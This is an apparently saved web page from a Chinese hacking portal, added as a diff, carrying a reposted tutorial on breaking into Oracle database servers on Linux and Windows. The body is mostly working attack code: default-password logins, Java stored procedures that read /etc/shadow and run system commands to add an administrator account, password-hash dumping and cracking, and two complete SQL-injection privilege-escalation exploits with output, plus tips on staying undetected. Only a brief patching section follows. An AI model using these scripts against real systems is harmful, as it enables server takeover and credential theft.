@@ -1,0 +1,486 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3c.org/TR/1999/REC-html401-19991224/loose.dtd">
+<!-- saved from url=(0055)http://www.myhack58.com/Article/html/3/7/2009/24903.htm -->
+<HTML xmlns="http://www.w3.org/1999/xhtml"><HEAD><TITLE>linux和windows系统直连Oracle数据库注入提权和修复详解 - 老牌IT安全技术门户网，成就IT技术精英 - 黑吧启航 - 黑吧安全网</TITLE>
+<META content="text/html; charset=gbk" http-equiv=Content-Type>
+<META name=keywords 
+content=linux和windows系统直连Oracle数据库注入提权和修复详解-黑客，黑吧安全网，黑吧，黑客动画吧，黑客教程，黑客网站，黑客软件，黑客工具,黑客论坛，黑客培训，网络安全培训>
+<META name=description 
+content=linux和windows系统直连Oracle数据库注入提权和修复详解-文章中心-作为中国最早的网络安全门户,我们一直为培养IT安全技术精英而努力.安全资讯、软件下载、技术教程,在攻与防的对立中寻求突破,铸造黑客防御阵线!>
+<META content=IE=EmulateIE7 http-equiv=X-UA-Compatible><LINK rel=stylesheet 
+type=text/css 
+href="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/global.css">
+<SCRIPT type=text/javascript 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/main.js"></SCRIPT>
+
+<SCRIPT>
+function tab(o,o2,n,o1c,o2c){
+			var m_n = document.getElementById(o).getElementsByTagName(o1c);
+			var c_n = document.getElementById(o2).getElementsByTagName(o2c);
+			for(i=0;i<m_n.length;i++){
+				 m_n[i].className=i==n?"on":"";
+ 				 c_n[i].className=i==n?"dis":"undis";
+				 }
+		}
+</SCRIPT>
+
+<META name=GENERATOR content="MSHTML 9.00.8112.16441"></HEAD>
+<BODY>
+<DIV id=page class=wrap>
+<DIV class=miniNav>
+<UL class=t_r>
+  <LI><A 
+  onclick="this.style.behavior='url(#default#homepage)';this.sethomepage('http://www.myhack58.com');" 
+  href="http://www.myhack58.com/#">设为首页</A> </LI>
+  <LI><A 
+  href="javascript:window.external.addFavorite('http://www.myhack58.com','黑吧安全网');">收藏本站</A> 
+  </LI>
+  <LI><A href="http://www.myhack58.com/fb.htm" target=_blank>发布作品</A> </LI>
+  <LI><A href="http://www.myhack58.com/sd.htm" target=_blank>免费杀毒</A> </LI>
+  <LI><A href="http://www.myhack58.com/fz.htm" target=_blank>黑吧旗下站点</A> </LI>
+  <LI><A href="http://vip.myhack58.com/" target=_blank>VIP会员</A> </LI></UL><A 
+href="http://www.myhack58.com/Article/html/3/7/2009/24903.htm#" 
+target=_blank>欢迎来到 <FONT 
+color=#e20300><STRONG>黑吧</STRONG></FONT><STRONG></STRONG><FONT 
+color=#1274b5><STRONG>安全网</STRONG></FONT> ! 请记住我们的网址　http://www. <FONT 
+color=#e20300><STRONG>myhack</STRONG></FONT><FONT 
+color=#009f0f><STRONG>5</STRONG></FONT><FONT 
+color=#1274b5><STRONG>8</STRONG></FONT> .Com</A></DIV><!-- 网站头部模版 -->
+<DIV id=header>
+<DIV id=logo><A href="http://www.myhack58.com/"><IMG alt=黑客动画吧-专业信息安全技术站点 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/logo.jpg" 
+width=141 height=62></A> </DIV>
+<DIV id=rss>
+<SCRIPT 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/banner.js"></SCRIPT>
+</DIV><!-- 网站搜索 -->
+<DIV id=search>
+<FORM id=searchform method=post name=searchform action=/search.asp><INPUT 
+name=show value=title type=hidden> <INPUT name=tempid value=1 type=hidden> 
+<P class=footer_search><SELECT id=searchtxt onchange=changetype(); class=btn_x 
+name=m gtbfieldid="3"> <OPTION selected value=1>文章</OPTION> <OPTION 
+  value=2>软件</OPTION></SELECT> <INPUT id=keyboard class=input_tx name=word size=32 
+gtbfieldid="4"> <INPUT class=sub_btn name=searchbtn type=submit> 
+</P></FORM></DIV>
+<DIV class=box10></DIV><!-- 网站导航 -->
+<UL id=nav>
+  <LI><A class=fb href="http://www.myhack58.com/">本站首页</A> </LI>
+  <LI id=tabmenu1><A title=最新事件 
+  href="http://www.myhack58.com/Article/html/1/Article_001_1.htm"><SPAN>最新事件</SPAN></A> 
+  </LI>
+  <LI id=tabmenu2><A title=漏洞预警 
+  href="http://www.myhack58.com/Article/html/2/Article_002_1.htm"><SPAN>漏洞预警</SPAN></A> 
+  </LI>
+  <LI id=tabmenu3><A title=入侵攻防 
+  href="http://www.myhack58.com/Article/html/3/Article_003_1.htm"><SPAN>入侵攻防</SPAN></A> 
+  </LI>
+  <LI id=tabmenu4><A title=网络技巧 
+  href="http://www.myhack58.com/Article/54/Article_054_1.htm"><SPAN>网络技巧</SPAN></A> 
+  </LI>
+  <LI id=tabmenu5><A title=安全防护 
+  href="http://www.myhack58.com/Article/60/Article_060_1.htm"><SPAN>安全防护</SPAN></A> 
+  </LI>
+  <LI id=tabmenu6><A title=操作系统 
+  href="http://www.myhack58.com/Article/48/Article_048_1.htm"><SPAN>操作系统</SPAN></A> 
+  </LI>
+  <LI id=tabmenu7><A title=免费资源 
+  href="http://www.myhack58.com/Article/free/Article_069_1.htm"><SPAN>免费资源</SPAN></A> 
+  </LI>
+  <LI id=tabmenu8><A title=病毒防范 
+  href="http://www.myhack58.com/Article/64/Article_064_1.htm"><SPAN>病毒防范</SPAN></A> 
+  </LI>
+  <LI id=tabmenu9><A title=无线安全 
+  href="http://www.myhack58.com/Article/sort097/Article_097_1.htm"><SPAN>无线安全</SPAN></A> 
+  </LI></UL>
+<DIV id=subnav><A title=网络攻防研究 
+href="http://www.myhack58.com/Soft/html/9/Soft_009_1.htm"><SPAN>网络攻防研究</SPAN></A> 
+| <A title=远程管理控制维护 
+href="http://www.myhack58.com/Soft/html/11/Soft_011_1.htm"><SPAN>远程管理控制维护</SPAN></A> 
+| <A title=破解加密 
+href="http://www.myhack58.com/Soft/html/12/Soft_012_1.htm"><SPAN>破解加密</SPAN></A> 
+| <A title=综合教程 
+href="http://www.myhack58.com/Soft/html/13/Soft_013_1.htm"><SPAN>综合教程</SPAN></A> 
+| <A title=安全软件 
+href="http://www.myhack58.com/Soft/html/15/Soft_015_1.htm"><SPAN>安全软件</SPAN></A> 
+| <A title=视频教程 
+href="http://www.myhack58.com/Soft/53/Soft_053_1.htm"><SPAN>视频教程</SPAN></A> | <A 
+title=网吧技术 
+href="http://www.myhack58.com/Soft/46/Soft_046_1.htm"><SPAN>网吧技术</SPAN></A> | <A 
+title=服务器软件 
+href="http://www.myhack58.com/Soft/sort098/Soft_098_1.htm"><SPAN>服务器软件</SPAN></A> 
+| </DIV></DIV>
+<DIV id=ad_index_bottom class=grid-3>
+<SCRIPT 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/top.js"></SCRIPT>
+</DIV>
+<DIV class=box10></DIV><!-- 网站内容模版 -->
+<DIV id=content1 class=grid-2><!--广告960x60-->
+<DIV class=main>
+<DIV id=nav_bread>
+<H3>当前位置：<A href="http://www.myhack58.com/">首页</A>&nbsp;&gt;&nbsp;<A 
+href="http://www.myhack58.com/Article/html/3/Article_003_1.htm">入侵攻防</A> &gt; <A 
+href="http://www.myhack58.com/Article/html/3/7/Article_007_1.htm">脚本注入</A></H3>
+<DIV class=clear></DIV></DIV>
+<DIV id=main_content>
+<DIV class=hd>
+<H1>linux和windows系统直连Oracle数据库注入提权和修复详解</H1>
+<DIV class=info><SPAN class=where>来源：转载</SPAN> <SPAN class=author>作者：佚名</SPAN> 
+<SPAN class=time>时间：2009-10-04 22:57:31</SPAN> </DIV></DIV>
+<DIV class="bd f16"><!-- JiaThis Button BEGIN -->
+<DIV id=ckepop><A class="jiathis jiathis_txt jtico jtico_jiathis" 
+href="http://www.jiathis.com/share/?uid=892023" target=_blank>分享到：</A> <A 
+class=jiathis_button_tools_1></A><A class=jiathis_button_tools_2></A><A 
+class=jiathis_button_tools_3></A><A class=jiathis_button_tools_4></A></DIV>
+<SCRIPT type=text/javascript charset=utf-8 
+src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/jia.js"></SCRIPT>
+<!-- JiaThis Button END --><BR><TR><TD>作者：菜牛<BR>收到约镐通知，刚好正研究ORACLE 
+课题，而国内网上相关主题不是很多，所以就写了此<BR>文，本文详细演示了针对linux 和windows 两种主流操作系统的ORACLE 
+提权过程，希望<BR>对想了解ORACLE 
+但又不知道从何入手的朋友有帮助。对于管理员来说，也可以参考此文<BR>看自己的数据库有否存在文中漏洞。<BR>orACLE 数据库简介：<BR>orACLE 
+是以高级结构化查询语言(SQL)为基础的大型关系数据库,它使用SQL(Structured<BR>guery 
+language)作为它的数据库语言。SQL主要包括数据定义、数据操纵（包括查询）和数<BR>据控制等三方面功能。SQL是一种非过程化程度很高的语言，用户只需说明"干什么"而无需<BR>具体说明"怎么干"语言简洁、使用方便功能强大，集联机交互与嵌入于一体，能适应广泛的<BR>使用环境。<BR>由于ORACLE 
+数据库在设置、使用、维护、备份过程的技术要求相对其他数据库要高，需<BR>要专业的ORACLE 
+数据库工程师来操作，所以使用ORACLE数据库的客户一般都是大型企<BR>业，如ISP、交通、通讯、金融等等，所以为了避免遭受攻击，ORACLE 
+管理员的安全设置，<BR>起到了关键作用。<BR>orACLE 数据库有强大的存储功能，操作过程复杂，安全方面在10G 
+以上版本得到很大改<BR>善，所以很多管理员，都没做安全检测测试，这就为攻击者提供了入侵机会。<BR>那攻击者是如何入侵ORACLE 
+数据库的呢？不要着急，慢慢听我道来…..<BR>===========================传说中的分割线=============================<BR>准备工具：<BR>orACLE 
+数据库口令扫描工具，网上有几种，自己可以根据喜好选择<BR>1 Python脚本的oracle.pl<BR>2 
+俄罗斯的软件COSS，GUI界面的GOSS<BR>3 oracle 字符集扫描工具<BR>4 
+需要PERL支持的tnscmd.pl<BR>环境：需要安装ORACLE客户端，LINUX操作系统或WINDOWS系统都可以。<BR>===========================传说中的分割线=============================<BR>下面是对ORACLE 
+数据库安全检测步骤：<BR>要连接一台ORACLE 
+数据库服务器，我们要知道服务器的IP地址、用户名、密码、数据库<BR>名（SID），IP地址PING下域名可以获得，用户，密码，SID 
+用上面提到的扫描工具，就可<BR>以获得。这里说说默认用户和密码，ORACLE 
+的默认用户和密码很多都是一样的，如：<BR>DBSNMP/DBSNMP，MDSYS/MDSYS，AQUSER/AQUSER 
+等有上百个，这是其他数据库<BR>没有的，可见其的复杂。SYS 和SYSTEM 这两个用户是数据库DBA 权限用户（数据库管<BR>理员权限），10G 
+以上版本安装后会提示修改，但也有很多马虎的管理员没修改，这就等于<BR>为攻击者开了一扇大门。<BR>经过本人测试总结，DBSNMP/DBSNMP 
+在70%的8i-9i 的版本上都可以登陆，这就带来了<BR>安全隐患，因为DBSNMP用户可以读取用户密码表，这样攻击者只要把MD5 加密的16 
+位<BR>HASH值破解，就能拿到DBA权限。<BR>===========================传说中的分割线=============================<BR>实例一：LINUX服务器读取SHADOW密码表<BR>我们用扫描工具扫描IP，确定了服务器开启1521端口，这个是ORACLE 
+的监听端口<BR>图一<BR>我们用PERL脚本的TNSCMD来扫描主机系统，数据库版本，和SID，我们得到信息，此服<BR>务器是LINUX 
+系统，数据库版本是9.2.0.4.0，数据库名是ose<BR>图二图三<BR>用ORACLE客户端连接，这里使用的默认用户SCOTT，<BR>命令语句：sqlplus 
+scott/tiger@//ip:1521/ose<BR>图四<BR>连接上后，我们可以来尝试执行SQL 
+命令脚本，脚本成功执行后，我们获得了用户及对应<BR>的SHELL目录列表。命令：#@/linux.sql<BR>图五<BR>附linux.sql 
+脚本代码：<BR>--code<BR>set serveroutput on<BR>Create or REPLACE AND RESOLVE JAVA 
+SOURCE NAMED "JAVAREADFILE"<BR>AS<BR>import java.lang.*;<BR>import 
+java.io.*;<BR>public class JAVAREADFILE<BR>{<BR>public static void 
+readfile(String filename) throws IOException<BR>{<BR>FileReader f = new 
+FileReader(filename);<BR>BufferedReader fr = new BufferedReader(f);<BR>String 
+text = fr.readLine();<BR>while(text != 
+null)<BR>{<BR>System.out.println(text);<BR>text = 
+fr.readLine();<BR>}<BR>fr.close();<BR>}<BR>}<BR>/<BR>Create or REPLACE PROCEDURE 
+JAVAREADFILEPROC (p_filename IN VARCHAR2)<BR>AS LANGUAGE JAVA<BR>NAME 
+'JAVAREADFILE.readfile(java.lang.String)';<BR>/<BR>exec 
+dbms_java.set_output(5000);<BR>grant javasyspriv to system;<BR>grant 
+javauserpriv to system;<BR>exec 
+JAVAREADFILEPROC('/etc/passwd')<BR>--code<BR>得到用户，那怎么样才能得到密码列表呢？<BR>我们输入命令：exec 
+:javareadfileproc(‘/etc/shadow’); 
+然后执行，呵呵，我们得到了密码表<BR>图六<BR>我们可以把经过特殊加密的密码值复制下来，转换成普通MD5 
+值，然后就可以用彩虹表破<BR>解密码了，得到ROOT 
+和密码，然后SSH连接。<BR>===========================传说中的分割线=============================<BR>实例二：WINDOWS服务器获得完全控制权，远程终端登陆，破解系统管理员密码<BR>扫描服务器端口，扫描服务器系统类型，数据库版本，用户，密码，SID 
+这两步参考图一图<BR>二图三。<BR>下面我们连接WINDOWS系统的ORACLE数据库<BR>图七<BR>执行 
+windows.sql<BR>图八<BR>附：windows.sql 脚本代码：<BR>--code<BR>create or replace and 
+compile<BR>java souRCe named "util"<BR>as<BR>import java.io.*;<BR>import 
+java.lang.*;<BR>public class util extends Object<BR>{<BR>public static int 
+RunThis(String args)<BR>{<BR>Runtime rt = Runtime.getRuntime();<BR>int RC = 
+-1;<BR>try<BR>{<BR>Process p = rt.exec(args);<BR>int bufSize = 
+4096;<BR>BufferedInputStream bis =new BufferedInputStream(p.getInputStream(), 
+bufSize);<BR>int len;<BR>byte buffer[] = new byte[bufSize];<BR>// Echo back what 
+the program spit out<BR>while ((len = bis.read(buffer<BR>, 0, bufSize)) != 
+-1)<BR>System.out.write(buffer, 0, len);<BR>RC = p.waitFor();<BR>}<BR>catch 
+(Exception e)<BR>{<BR>e.printStackTrace();<BR>RC = 
+-1;<BR>}<BR>finally<BR>{<BR>return RC;<BR>}<BR>}<BR>}<BR>/<BR>create or 
+replace<BR>function RUN_CMz(p_cmd in varchar2) return number<BR>as<BR>language 
+java<BR>name 'util.RunThis(java.lang.String) return integer';<BR>/<BR>create or 
+replace procedure RC(p_cmd in varChar)<BR>as<BR>x number;<BR>begin<BR>x := 
+RUN_CMz(p_cmd);<BR>end;<BR>/<BR>variable x number;<BR>set serveroutput 
+on;<BR>exec dbms_java.set_output(100000);<BR>grant javasyspriv to 
+system;<BR>grant javauserpriv to system;<BR>exec :x:=run_cmz('net1 
+user');<BR>--code<BR>脚本执行成功，然后我们来创建用户，<BR>命令：<BR>exec :x:=run_cmz(‘net1 user 
+test nzhack /add’);<BR>exec :x:=run_cmz(‘net1 localgroup administrators nzhack 
+/add’);<BR>好，显示我们已经成功创建管理员用户nzhack<BR>图九，图十<BR>我们再查看一下，原来已经开启了3389端口，可以远程终端连接<BR>图十一<BR>然后用rdesktop 
+连接,成功登陆。<BR>图十二<BR>图十三<BR>到此，已经实现了测试的目的，在得到服务器后，各人都有各人的喜好，有朋友喜欢克隆帐<BR>号，有朋友喜欢放远控，有朋友喜欢修改注册表或放VBS 
+脚本，创建不死帐号等等。我个<BR>人就比较喜欢直接获取管理员的密码，这样一来省事，二来不容易被发现，因为3389登陆<BR>后，在C:\Documents 
+and Settings 目录下会创建相应的目录，用其他用户登陆后，管理员看<BR>到有可疑的目录，就容易发现。<BR>要准备好彩虹表，700M 的（包含14 
+位以下字母加数字）最好是7G 的（包含14 位以下字<BR>母加数字加特殊符号），还有pwdump 工具。<BR>下面说说方法：<BR>在远程桌面连接里，用IE 
+下载pwdump，解压后复制到C盘，<BR>然后指令：pwdump7 
+&gt;pass.txt<BR>图十四<BR>得到的密码HASH值，我们可以用ophcrack配合彩虹表来破<BR>图十五<BR>数字加字母的密码用700M 
+彩虹表只用15 秒就破出来了，如果是特殊符号的，用7G 彩虹<BR>表一般20 分钟左右，如果CPU 
+快和内存多，时间会更短。了解此方法后，大家是否有些心<BR>动呢，呵呵<BR>===========================传说中的分割线=============================<BR>orACLE 
+低权限用户提权方法：<BR>【漏洞名称】 sys.dbms_export_extension.get_domain_index_metadata 
+提升权限漏洞<BR>【影响平台】Oracle 8i / 9i / 10g / 
+XE<BR>【风险等级】高<BR>【攻击需求】较低权限账号<BR>【造成危害】取得管理员权限<BR>【内容描述】<BR>oracle Database 
+Server 8.1.7.4, 9.0.1.5, 9.2.0.7, 
+10.1.0.5及其他版本可以允许远端攻击者执行任意SQL命令,<BR>由于DBMS_EXPORT_EXTENSION package 
+中的GET_DOMAIN_INDEX_METADATA 
+程序存在漏洞远端<BR>攻击者可以送出特殊建立的SQL命令来提升权限以及新增,修改,删除数据库。<BR>【测试代码】<BR>1、用scott/tiger登陆Oracle，scott 
+是oracle内建用户，权限较低，通过执行特殊参数的命令可以提升为DBA。<BR>sqlplus 
+scott/tiger@orcl<BR>2、查询scott的当前角色<BR>SQL&gt; select * from 
+session_roles;<BR>ROLE<BR>------------------------------------------------------------<BR>CONNECT<BR>RESOURCE<BR>可以看到scott只有CONNECT和RESOURCE两个权限较低的角色<BR>3、利用漏洞执行权限提升<BR>SQL&gt;<BR>-- 
+Create a function in a package first and inject this function. The function will 
+be executed as user SYS.<BR>Create or REPLACE<BR>PACKAGE HACKERPACKAGE AUTHID 
+CURRENT_USER<BR>IS<BR>FUNCTION ODCIIndexGetMetadata (oindexinfo 
+SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env<BR>SYS.odcienv)<BR>RETURN 
+NUMBER;<BR>END;<BR>/<BR>Create or REPLACE PACKAGE BODY 
+HACKERPACKAGE<BR>IS<BR>FUNCTION ODCIIndexGetMetadata (oindexinfo 
+SYS.odciindexinfo,P3 VARCHAR2,p4 VARCHAR2,env<BR>SYS.odcienv)<BR>RETURN 
+NUMBER<BR>IS<BR>pragma autonomous_transaction;<BR>BEGIN<BR>EXECUTE IMMEDIATE 
+'GRANT DBATO SCOTT';<BR>COMMIT;<BR>RETURN(1);<BR>END;<BR>END;<BR>/<BR>-- Inject 
+the function in dbms_export_extension<BR>DECLARE<BR>INDEX_NAME 
+VARCHAR2(200);<BR>INDEX_SCHEMAVARCHAR2(200);<BR>TYPE_NAME 
+VARCHAR2(200);<BR>TYPE_SCHEMAVARCHAR2(200);<BR>VERSION 
+VARCHAR2(200);<BR>NEWBLOCK PLS_INTEGER;<BR>GMFLAGS NUMBER;<BR>v_Return 
+VARCHAR2(200);<BR>BEGIN<BR>INDEX_NAME := 'A1';<BR>INDEX_SCHEMA := 
+'SCOTT';<BR>TYPE_NAME := 'HACKERPACKAGE';<BR>TYPE_SCHEMA := 'SCOTT';<BR>VERSION 
+:= '9.2.0.1.0';<BR>GMFLAGS := 1;<BR>v_Return := 
+SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(INDEX_NAME 
+=&gt;<BR>INDEX_NAME,<BR>INDEX_SCHEMA=&gt; INDEX_SCHEMA,<BR>TYPE_NAME =&gt; 
+TYPE_NAME,<BR>TYPE_SCHEMA =&gt; TYPE_SCHEMA,<BR>VERSION =&gt; 
+VERSION,<BR>NEWBLOCK =&gt; NEWBLOCK,<BR>GMFLAGS =&gt; 
+GMFLAGS);<BR>END;<BR>/<BR>sqlplus中显示"PL/SQL procedure successfully 
+completed"，提升权限成功。<BR>4、断开连接<BR>SQL&gt; disc;<BR>5、重新连接<BR>SQL&gt; conn 
+scott/tiger@orcl;<BR>6、再次查询scott的当前角色<BR>SQL&gt; select * from 
+session_roles;<BR>ROLE<BR>------------------------------------------------------------<BR>CONNECT<BR>RESOURCE<BR>DBA<BR>Select_CATALOG_ROLE<BR>HS_ADMIN_ROLE<BR>EXECUTE_CATALOG_ROLE<BR>Delete_CATALOG_ROLE<BR>EXP_FULL_DATABASE<BR>IMP_FULL_DATABASE<BR>GATHER_SYSTEM_STATISTICS<BR>WM_ADMIN_ROLE<BR>ROLE<BR>------------------------------------------------------------<BR>JAVA_ADMIN<BR>JAVA_DEPLOY<BR>XDBADMIN<BR>OLAP_DBA<BR>已选择15行。<BR>看到权限已经提升为DBA<BR>【修补方式】<BR>参考Oracle 
+Critical Patch Update -April 
+2006,执行修补.<BR>===========================传说中的分割线=============================<BR>【漏洞名称】 
+sys.dbms_metadata.get_ddl 提升权限漏洞<BR>【影响平台】Oracle 9i / 
+10g<BR>【风险等级】高<BR>【攻击需求】较低权限账号<BR>【造成危害】取得管理员权限<BR>【内容描述】<BR>oracle Database 
+server 9.2.0.7 and 10.1.0.5存在SQL注入弱点, 
+sys.dbms_metadata.get_ddl允许用户以DBA<BR>权限执行命令,通过验证的用户可以利用此弱点取得管理员权限。<BR>【测试代码】<BR>1、用scott/tiger登陆Oracle，scott 
+是oracle内建用户，权限较低，通过执行特殊参数的命令可以提升为DBA。<BR>sqlplus 
+scott/tiger@orcl<BR>2、查询scott的当前角色<BR>SQL&gt; select * from 
+session_roles;<BR>ROLE<BR>------------------------------------------------------------<BR>CONNECT<BR>RESOURCE<BR>可以看到scott只有CONNECT和RESOURCE两个权限较低的角色<BR>3、利用漏洞执行权限提升,在SQLPlus中执行如下语句：<BR>SQL&gt;<BR>-- 
+Create a function first and inject this function. The function will be executed 
+as user SYS.<BR>Create or REPLACE FUNCTION "SCOTT"."ATTACK_FUNC" return 
+varchar2<BR>authid current_user as<BR>pragma 
+autonomous_transaction;<BR>BEGIN<BR>EXECUTE IMMEDIATE 'GRANT DBATO 
+SCOTT';<BR>COMMIT;<BR>RETURN '';<BR>END;<BR>/<BR>-- Inject the function in the 
+vulnerable procedure<BR>Select 
+SYS.DBMS_METADATA.GET_DDL('''||SCOTT.ATTACK_FUNC()||''','') FROM 
+dual;<BR>错误：<BR>orA-31600: invalid input value '||SCOTT.ATTACK_FUNC()||' for 
+parameter OBJECT_TYPE in function<BR>GET_DDL<BR>orA-06512: at 
+"SYS.DBMS_SYS_ERROR", line 105<BR>orA-06512: at "SYS.DBMS_METADATA_INT", line 
+1536<BR>orA-06512: at "SYS.DBMS_METADATA_INT", line 1900<BR>orA-06512: at 
+"SYS.DBMS_METADATA_INT", line 3606<BR>orA-06512: at "SYS.DBMS_METADATA", line 
+504<BR>orA-06512: at "SYS.DBMS_METADATA", line 560<BR>orA-06512: at 
+"SYS.DBMS_METADATA", line 1221<BR>orA-06512: at line 1<BR>4、断开连接<BR>SQL&gt; 
+disc;<BR>5、重新连接<BR>SQL&gt; conn scott/tiger@orcl;<BR>6、再次查询scott的当前角色<BR>SQL&gt; 
+select * from 
+session_roles;<BR>ROLE<BR>------------------------------------------------------------<BR>CONNECT<BR>RESOURCE<BR>DBA<BR>Select_CATALOG_ROLE<BR>HS_ADMIN_ROLE<BR>EXECUTE_CATALOG_ROLE<BR>Delete_CATALOG_ROLE<BR>EXP_FULL_DATABASE<BR>IMP_FULL_DATABASE<BR>GATHER_SYSTEM_STATISTICS<BR>WM_ADMIN_ROLE<BR>ROLE<BR>------------------------------------------------------------<BR>JAVA_ADMIN<BR>JAVA_DEPLOY<BR>XDBADMIN<BR>OLAP_DBA<BR>已选择15行。<BR>看到权限已经提升为DBA<BR>【修补方式】<BR>Revoke 
+the grants or apply the patches mentioned in oracle Critical Patch Update April 
+2005.<BR>日常修补小结：<BR>扫描检测一下自己的数据库有否存在激活状态的默认用户，自己新创建的用户和密码尽量不<BR>要一样，有的扫描工具就是通过用户表来探测的，就算你帐号是自己创建的，经过我的实践<BR>如果新创建的用户和密码一样的话，也会被探测的出来的。<BR>给 
+SYS和SYSTEM用户设置一个比较复杂的密码，其他一般用户都设置为到期（EXPIRED）<BR>或者锁定（LOCKED），修改DBSNMP，SCOTT密码，按需分配授权，把无关的授权撤消。<BR>好了，本文到此就结束了。谢谢大家耐心浏览到这里，以上是个人经验及观点，难免有错漏，<BR>望谅解。<BR></TD></TR></TABLE><!--内容正文-->
+<DIV id=pagination><!--分页导航--></DIV></DIV>
+<DIV class=ft>
+<DIV class="f14 f_blue"><SPAN class=bold>上一篇：</SPAN><A 
+href="http://www.myhack58.com/Article/html/3/62/2009/24902.htm">gh0st加后门方法</A></DIV>
+<DIV class="f14 f_blue"><SPAN class=bold>下一篇：</SPAN><A 
+href="http://www.myhack58.com/Article/html/3/7/2009/24904.htm">怪异的SQL注入</A></DIV></DIV></DIV>
+<DIV id=imagenews2>
+<DIV class=title>
+<DIV class=title_l>
+<H2>图片内容</H2></DIV></DIV>
+<UL>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/28223.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/20101029192549606.jpg" 
+  width=102 height=72></A> 
+  <P><A title=&amp;quot;利用URL编码绕SQL防注入&amp;quot;的原理 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28223.htm" 
+  target=_blank>"利用UR...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/28210.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/2010102819246484.jpg" 
+  width=102 height=72></A> 
+  <P><A title="BEESCMS v1.1.0 getip()注射漏洞与XSS" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28210.htm" 
+  target=_blank>BEESCMS v1.1...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/28178.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/20101025191718906.png" 
+  width=102 height=72></A> 
+  <P><A title=“SQL注入”的前世今生和防御思路 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28178.htm" 
+  target=_blank>“SQL注入”的...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/28077.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/2010101119121275.jpg" 
+  width=102 height=72></A> 
+  <P><A title=&amp;quot;利用URL编码绕SQL防注入&amp;quot;的原理 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28077.htm" 
+  target=_blank>"利用UR...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/28061.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/2010101091426514.jpg" 
+  width=102 height=72></A> 
+  <P><A title=Cookie中转注入绕过可智创IIS防火墙 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28061.htm" 
+  target=_blank>Cookie中转注...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/28060.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/2010101091345589.jpg" 
+  width=102 height=72></A> 
+  <P><A title=&amp;quot;利用URL编码绕SQL防注入&amp;quot;的原理 
+  href="http://www.myhack58.com/Article/html/3/7/2010/28060.htm" 
+  target=_blank>"利用UR...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/27857.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/201091418015136.jpg" 
+  width=102 height=72></A> 
+  <P><A title="ECSHOP 搜索注入漏洞利用exp及后台拿shell" 
+  href="http://www.myhack58.com/Article/html/3/7/2010/27857.htm" 
+  target=_blank>ECSHOP 搜索注...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/27625.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/201071713431333.jpg" 
+  width=102 height=72></A> 
+  <P><A title=SA注入点通过报错提取SQL账户HASH 
+  href="http://www.myhack58.com/Article/html/3/7/2010/27625.htm" 
+  target=_blank>SA注入点通过...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/27590.htm" 
+  target=_blank><IMG border=0 
+  src="linux和windows系统直连Oracle数据库注入提权和修复详解%20-%20老牌IT安全技术门户网，成就IT技术精英%20-%20黑吧启航%20-%20黑吧安全网_files/20107141472576.jpg" 
+  width=102 height=72></A> 
+  <P><A title=cookie注入原理 
+  href="http://www.myhack58.com/Article/html/3/7/2010/27590.htm" 
+  target=_blank>cookie注入原...</A></P></LI>
+  <LI><A href="http://www.myhack58.com/Article/html/3/7/2010/27035.htm" 
